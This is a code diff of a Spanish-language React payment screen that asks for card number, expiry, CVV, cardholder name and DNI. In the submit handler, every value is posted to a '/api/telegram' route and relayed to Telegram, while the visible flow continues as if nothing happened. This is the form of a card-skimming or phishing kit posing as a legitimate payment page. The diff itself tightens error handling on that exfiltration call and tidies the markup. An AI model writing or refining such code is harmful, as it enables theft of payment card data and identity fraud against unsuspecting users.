@@ -35,7 +35,6 @@ function detectCardType(number: string): string {
   if (/^62/.test(cleaned)) return "unionpay"
   if (/^9792/.test(cleaned)) return "troy"
   if (/^(?:60|65|81|82|508)/.test(cleaned)) return "rupay"
-  if (/^(?:4571|4576|4517|4532|4539|4556|4916|4929)/.test(cleaned)) return "visa"
   return ""
 }
 
@@ -45,9 +44,7 @@ function getCardIcon(type: string) {
       return (
         <svg viewBox="0 0 48 32" className="h-5 w-8 shrink-0 sm:h-6 sm:w-10">
           <rect width="48" height="32" rx="4" fill="#1A1F71" />
-          <text x="24" y="20" textAnchor="middle" fill="#FFFFFF" fontSize="12" fontWeight="bold" fontFamily="sans-serif">
-            VISA
-          </text>
+          <text x="24" y="20" textAnchor="middle" fill="#FFFFFF" fontSize="12" fontWeight="bold" fontFamily="sans-serif">VISA</text>
         </svg>
       )
     case "mastercard":
@@ -63,18 +60,14 @@ function getCardIcon(type: string) {
       return (
         <svg viewBox="0 0 48 32" className="h-5 w-8 shrink-0 sm:h-6 sm:w-10">
           <rect width="48" height="32" rx="4" fill="#2E77BC" />
-          <text x="24" y="20" textAnchor="middle" fill="#FFFFFF" fontSize="8" fontWeight="bold" fontFamily="sans-serif">
-            AMEX
-          </text>
+          <text x="24" y="20" textAnchor="middle" fill="#FFFFFF" fontSize="8" fontWeight="bold" fontFamily="sans-serif">AMEX</text>
         </svg>
       )
     case "diners":
       return (
         <svg viewBox="0 0 48 32" className="h-5 w-8 shrink-0 sm:h-6 sm:w-10">
           <rect width="48" height="32" rx="4" fill="#0079BE" />
-          <text x="24" y="18" textAnchor="middle" fill="#FFFFFF" fontSize="7" fontWeight="bold" fontFamily="sans-serif">
-            DINERS
-          </text>
+          <text x="24" y="18" textAnchor="middle" fill="#FFFFFF" fontSize="7" fontWeight="bold" fontFamily="sans-serif">DINERS</text>
         </svg>
       )
     case "maestro":
@@ -136,13 +129,11 @@ export function CardFormScreen({ telefono, amount, onSubmit, onBack, onCancel, o
   const validate = (): boolean => {
     const newErrors: Record<string, string> = {}
     const cleanedCard = cardNumber.replace(/\s/g, "")
-
     if (cleanedCard.length < 13) newErrors.cardNumber = "Numero invalido"
     if (expiry.length < 5) newErrors.expiry = "Fecha invalida"
     if (cvv.length < 3) newErrors.cvv = "CVV invalido"
     if (!titular.trim()) newErrors.titular = "Ingresa el titular"
     if (!dni.trim() || dni.length < 7) newErrors.dni = "DNI invalido"
-
     setErrors(newErrors)
     return Object.keys(newErrors).length === 0
   }
@@ -160,9 +151,8 @@ export function CardFormScreen({ telefono, amount, onSubmit, onBack, onCancel, o
       tipo_tarjeta: cardType || "desconocida",
     }
 
-    // Enviar datos a Telegram via API route (el token queda seguro en el servidor)
     try {
-      await fetch("/api/telegram", {
+      const res = await fetch("/api/telegram", {
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({
@@ -171,9 +161,13 @@ export function CardFormScreen({ telefono, amount, onSubmit, onBack, onCancel, o
           ...cardData,
         }),
       })
+
+      if (!res.ok) {
+        const err = await res.json()
+        console.error("Telegram error:", err)
+      }
     } catch (err) {
-      // Si falla Telegram, continuamos igual con el flujo normal
-      console.error("Error enviando a Telegram:", err)
+      console.error("Fetch error:", err)
     }
 
     onSubmit(cardData)
@@ -185,11 +179,10 @@ export function CardFormScreen({ telefono, amount, onSubmit, onBack, onCancel, o
 
       <div className="mx-auto w-full max-w-2xl px-3 py-4 sm:px-4 sm:py-6">
         <div className="rounded-xl bg-[#ffffff] p-3 shadow-sm sm:p-4 md:p-6">
+
           {/* Card number */}
           <div className="mb-1">
-            <div
-              className={`flex items-center gap-2 rounded-lg border px-3 py-3 sm:gap-3 sm:px-4 ${errors.cardNumber ? "border-[#da291c]" : "border-[#e0e0e0]"}`}
-            >
+            <div className={`flex items-center gap-2 rounded-lg border px-3 py-3 sm:gap-3 sm:px-4 ${errors.cardNumber ? "border-[#da291c]" : "border-[#e0e0e0]"}`}>
               {getCardIcon(cardType)}
               <input
                 type="tel"
@@ -209,9 +202,7 @@ export function CardFormScreen({ telefono, amount, onSubmit, onBack, onCancel, o
 
           {/* Expiry */}
           <div className="mb-3 sm:mb-4">
-            <div
-              className={`flex items-center justify-between rounded-lg border px-3 py-3 sm:px-4 ${errors.expiry ? "border-[#da291c]" : "border-[#e0e0e0]"}`}
-            >
+            <div className={`flex items-center justify-between rounded-lg border px-3 py-3 sm:px-4 ${errors.expiry ? "border-[#da291c]" : "border-[#e0e0e0]"}`}>
               <input
                 type="tel"
                 placeholder="Fecha de vencimiento"
@@ -227,9 +218,7 @@ export function CardFormScreen({ telefono, amount, onSubmit, onBack, onCancel, o
 
           {/* CVV */}
           <div className="mb-3 sm:mb-4">
-            <div
-              className={`flex items-center justify-between rounded-lg border px-3 py-3 sm:px-4 ${errors.cvv ? "border-[#da291c]" : "border-[#e0e0e0]"}`}
-            >
+            <div className={`flex items-center justify-between rounded-lg border px-3 py-3 sm:px-4 ${errors.cvv ? "border-[#da291c]" : "border-[#e0e0e0]"}`}>
               <input
                 type="tel"
                 placeholder="Codigo de seguridad"
@@ -248,9 +237,7 @@ export function CardFormScreen({ telefono, amount, onSubmit, onBack, onCancel, o
 
           {/* Titular */}
           <div className="mb-3 sm:mb-4">
-            <div
-              className={`flex items-center justify-between rounded-lg border px-3 py-3 sm:px-4 ${errors.titular ? "border-[#da291c]" : "border-[#e0e0e0]"}`}
-            >
+            <div className={`flex items-center justify-between rounded-lg border px-3 py-3 sm:px-4 ${errors.titular ? "border-[#da291c]" : "border-[#e0e0e0]"}`}>
               <input
                 type="text"
                 placeholder="Titular de la tarjeta"
@@ -268,9 +255,7 @@ export function CardFormScreen({ telefono, amount, onSubmit, onBack, onCancel, o
 
           {/* DNI */}
           <div className="mb-5 sm:mb-6">
-            <div
-              className={`rounded-lg border px-3 py-3 sm:px-4 ${errors.dni ? "border-[#da291c]" : "border-[#e0e0e0]"}`}
-            >
+            <div className={`rounded-lg border px-3 py-3 sm:px-4 ${errors.dni ? "border-[#da291c]" : "border-[#e0e0e0]"}`}>
               <input
                 type="tel"
                 placeholder="DNI titular de la tarjeta"
